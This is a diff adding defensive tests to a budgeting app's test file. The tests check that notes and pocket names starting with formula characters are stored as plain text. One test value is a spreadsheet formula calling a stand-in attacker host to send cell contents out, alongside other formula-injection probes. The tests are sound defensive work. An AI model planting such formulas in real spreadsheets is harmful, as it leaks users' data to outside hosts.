@@ -379,3 +379,31 @@ test('TZ: getState counts an expense logged at 00:30 SAST on the 1st in the NEW 
   assert.equal(sep.pockets[0].spent, 60, 'the 23:30 one is still September');
   s.restore();
 });
+
+/* ------------------------------------------------ formula injection (13) -- */
+
+test('INJECTION: text that would run as a formula is stored as plain text', () => {
+  const s = setup();
+  const evil = '=IMPORTDATA("https://evil.example/?"&A1)';
+  assert.equal(spend({ note: evil }).ok, true);
+  assert.equal(s.wb.txns._rows[1][5], "'" + evil, 'note');
+
+  const made = createPocket({ token: TOKEN, name: '=HYPERLINK("x")', account: '+cmd', limit: 10 });
+  assert.equal(made.ok, true);
+  assert.equal(made.pocket.name, '=HYPERLINK("x")', 'the reply shows what the user typed');
+  const row = s.wb.pockets._rows[2];
+  assert.equal(row[1], "'=HYPERLINK(\"x\")");
+  assert.equal(row[2], "'+cmd");
+
+  updatePocket({ token: TOKEN, pocketId: 'P01', name: '@SUM(1)', account: '-1+1' });
+  assert.equal(s.wb.pockets._rows[1][1], "'@SUM(1)");
+  assert.equal(s.wb.pockets._rows[1][2], "'-1+1");
+  s.restore();
+});
+
+test('INJECTION: ordinary text is written untouched', () => {
+  const s = setup();
+  spend({ note: 'Whole Foods = fine, 5+5' });
+  assert.equal(s.wb.txns._rows[1][5], 'Whole Foods = fine, 5+5');
+  s.restore();
+});
